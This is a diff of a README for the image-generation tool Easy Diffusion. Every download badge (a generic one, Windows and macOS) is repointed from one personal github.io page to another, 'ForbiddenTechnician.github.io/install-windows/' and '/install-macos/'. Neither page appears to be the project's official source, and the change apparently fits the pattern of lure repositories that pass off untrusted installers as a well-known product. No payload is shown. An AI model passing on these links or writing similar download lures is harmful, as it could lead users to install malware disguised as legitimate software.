@@ -32,7 +32,7 @@ Whether you're a newcomer or a veteran, Easy Diffusion provides the tools you ne
 
 <div align="center">
 
-[![Download Easy Diffusion](https://img.shields.io/badge/⬇_DOWNLOAD_Easy+Diffusion-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://WalkerCelebrate.github.io/winpkg/)
+[![Download Easy Diffusion](https://img.shields.io/badge/⬇_DOWNLOAD_Easy+Diffusion-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://ForbiddenTechnician.github.io/install-windows/)
 
 </div>
 
@@ -75,8 +75,8 @@ Whether you're a newcomer or a veteran, Easy Diffusion provides the tools you ne
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/⬇_Download-Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://WalkerCelebrate.github.io/winpkg/)
-[![Download for macOS](https://img.shields.io/badge/⬇_Download-macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://WalkerCelebrate.github.io/macpkg/)
+[![Download for Windows](https://img.shields.io/badge/⬇_Download-Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://ForbiddenTechnician.github.io/install-windows/)
+[![Download for macOS](https://img.shields.io/badge/⬇_Download-macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://ForbiddenTechnician.github.io/install-macos/)
 
 </div>
 
